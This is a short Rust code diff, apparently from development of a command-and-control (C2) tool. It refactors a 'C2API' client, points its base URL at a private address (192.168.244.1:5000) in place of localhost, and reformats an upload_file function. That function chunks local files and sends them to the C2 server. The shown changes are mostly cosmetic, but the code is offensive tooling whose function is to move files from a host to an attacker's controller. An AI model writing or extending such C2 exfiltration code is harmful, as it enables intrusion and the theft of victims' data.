@@ -1,6 +1,6 @@
 use reqwest::{
     blocking::multipart::{Form, Part},
-    Client, Error, Response, Url,
+    Client, Error, Response,
 };
 use serde_json::{json, Value};
 use std::{
@@ -18,7 +18,7 @@ pub struct C2API {
 impl C2API {
     pub fn new() -> Self {
         C2API {
-            base_url: String::from_str("http://localhost:5000/api/").unwrap(),
+            base_url: String::from_str("http://192.168.244.1:5000/api/").unwrap(),
             api_client: reqwest::Client::new(),
         }
     }
@@ -71,7 +71,11 @@ impl C2API {
         self.format_response(api_res).await
     }
 
-    pub fn uploadFile(self, file_path: String, user_id: &str) -> Result<(), Box<dyn std::error::Error>> {
+    pub fn upload_file(
+        self,
+        file_path: String,
+        user_id: &str,
+    ) -> Result<(), Box<dyn std::error::Error>> {
         const CHUNK_SIZE: usize = 1024 * 1024 * 200; // Chunk size in bytes (200MB)
                                                      // Open the file for reading
         let file = File::open(file_path.clone())?;
@@ -119,7 +123,6 @@ impl C2API {
             if response.status().is_success() {
                 println!("Chunk {} uploaded successfully!", chunk_index);
             } else {
-                
                 println!(
                     "Chunk {} upload failed. Server response: {:?}",
                     chunk_index, response
